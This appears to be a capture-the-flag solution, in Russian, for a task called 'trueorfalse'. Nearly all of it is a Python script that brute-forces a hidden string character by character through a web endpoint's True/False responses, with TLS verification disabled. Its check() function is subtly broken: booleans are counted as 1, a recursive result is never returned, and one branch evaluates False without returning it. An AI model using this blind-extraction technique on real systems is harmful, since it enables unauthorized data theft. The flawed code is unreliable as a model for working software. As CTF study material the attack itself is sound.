# Решение trueorfalse


```python 
import requests 
from bs4 import BeautifulSoup
import string


def requests_symbols(host, index, symbol):
    data = {
        'index': index,
        'value': symbol,
    }

    response = requests.post(host, data=data, verify=False)

    src = response.text

    soup = BeautifulSoup(src, 'html.parser')



    if soup.find("ul").find_all('li')[-1].text.split()[-1] == "True":
        return True
    else:
        return False
 
    


def check(host, index, value, local = 2):
    check_list = [1]
    for i in range(3):
        check_list.append(requests_symbols(host, index, value))
    if check_list.count(1) > 2:
        return True
    elif local >= 0:
        check(host, index, value, local-1)
    else:
        False


def for_func(host, list_symbols):

    # Итоговая строка
    string_out = ""

    index = 0
    count = 0

    while True:
        for value in list_symbols:
            if requests_symbols(host, index, value):
                print(f"{string_out=}, {index=} {value=}")
                if check(host, index, value): 
                    print(f"GOOD {string_out=}, {index=} {value=}")
                    string_out += value
                    break
        else:
            count += 1
        index += 1
        
        print(f"{string_out=}, {index=}")

        if count >= 1:
            break
    
    return string_out

def main():
    host = input("Введите host в формате http://127.0.0.1 ")


    list_symbols = list(string.ascii_letters)
    list_symbols.extend(string.digits)
    list_symbols.extend(string.punctuation)
    print(list_symbols)
    print(len(list_symbols))

    OUT = for_func(host=host, list_symbols=list_symbols)

    print(OUT)
    
 


if "__main__" == __name__:
    main()
```